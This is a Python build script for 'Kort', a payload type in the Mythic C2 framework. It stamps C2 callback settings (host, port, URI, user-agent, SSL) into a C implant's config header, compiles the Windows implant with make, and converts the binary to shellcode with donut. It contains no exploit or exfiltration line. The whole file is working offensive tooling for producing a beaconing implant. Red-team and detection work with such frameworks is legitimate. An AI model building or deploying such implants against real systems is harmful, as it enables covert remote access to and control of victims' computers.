import logging
import pathlib
import os
import subprocess
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class KortAgent(PayloadType):
    name = "Kort"
    file_extension = "bin"
    author = "@OldBear"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = """Basic Implant in C"""
    supports_dynamic_loading = False
    c2_profiles = ["http"]
    mythic_encrypts = False
    translation_container = "KortTranslation"
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose output format",
            choices=["shellcode"],
            default_value="shellcode"
        )
    ]
    agent_path = pathlib.Path(".")
    agent_icon_path = agent_path / "agent_functions" / "kort.png"
    agent_code_path = agent_path / "agent_code"

    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="..."),
        BuildStep(step_name="Configuring", step_description="Stamping in config values"),
        BuildStep(step_name="Compiling", step_description="Running make"),
        BuildStep(step_name="Converting to Shellcode", step_description="Running donut"),
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        build_msg = ""

        # --- Крок 1: параметри C2 ---
        c2_info = self.c2info[0]
        c2_params = c2_info.get_parameters_dict()
        callback_host = c2_params.get("callback_host", "http://127.0.0.1")
        callback_port = c2_params.get("callback_port", 80)
        post_uri = c2_params.get("post_uri", "data")
        headers = c2_params.get("headers", {}) or {}
        user_agent = headers.get("User-Agent", "Mozilla/5.0")
        uuid = self.uuid

        host = callback_host.replace("http://", "").replace("https://", "").split("/")[0]
        use_ssl = "TRUE" if callback_host.startswith("https") else "FALSE"

        # --- Крок 2: config.h ---
        config_content = f'''#ifndef CONFIG_H
#define CONFIG_H

#define CONFIG_UUID "{uuid}"
#define CONFIG_HOST L"{host}"
#define CONFIG_PORT {callback_port}
#define CONFIG_POST_URI L"/{post_uri.lstrip('/')}"
#define CONFIG_UA L"{user_agent}"
#define CONFIG_SSL {use_ssl}
#define CONFIG_SLEEP_JITTER 5000

#endif
'''
        config_path = self.agent_code_path / "include" / "config.h"
        with open(config_path, "w") as f:
            f.write(config_content)
        build_msg += f"[+] Wrote config.h:\n{config_content}\n"

        # --- Крок 3: make ---
        cwd = str(self.agent_code_path)
        try:
            proc = subprocess.run(
                ["make"],
                cwd=cwd, capture_output=True, text=True, timeout=300,
            )
            build_msg += f"[make stdout]\n{proc.stdout}\n"
            build_msg += f"[make stderr]\n{proc.stderr}\n"
            if proc.returncode != 0:
                return BuildResponse(status=BuildStatus.Error,
                                     build_message=build_msg, build_stderr=proc.stderr)
        except FileNotFoundError:
            return BuildResponse(status=BuildStatus.Error,
                                 build_message=build_msg + "\nmake not found in container")
        except subprocess.TimeoutExpired:
            return BuildResponse(status=BuildStatus.Error,
                                 build_message=build_msg + "\nCompilation timed out")

        # --- Крок 4: знайти EXE або DLL ---
        built_exe = self.agent_code_path / "Kort.exe"
        built_dll = self.agent_code_path / "Kort.dll"
        if built_exe.exists():
            src = built_exe
        elif built_dll.exists():
            src = built_dll
        else:
            return BuildResponse(status=BuildStatus.Error,
                                 build_message=build_msg + "\nNo Kort.exe / Kort.dll found after make")

        build_msg += f"[+] Built: {src} ({src.stat().st_size} bytes)\n"

        # --- Крок 5: donut ---
        try:
            import donut
        except ImportError:
            return BuildResponse(status=BuildStatus.Error,
                                 build_message=build_msg + "\ndonut-shellcode not installed")

        try:
            shellcode = donut.create(file=str(src))
        except Exception as e:
            return BuildResponse(status=BuildStatus.Error,
                                 build_message=build_msg + f"\ndonut failed: {e}")

        if not shellcode or len(shellcode) == 0:
            return BuildResponse(status=BuildStatus.Error,
                                 build_message=build_msg + "\ndonut returned empty shellcode")

        build_msg += f"[+] Shellcode size: {len(shellcode)} bytes\n"

        resp.payload = shellcode
        resp.build_message = build_msg
        resp.status = BuildStatus.Success
        return resp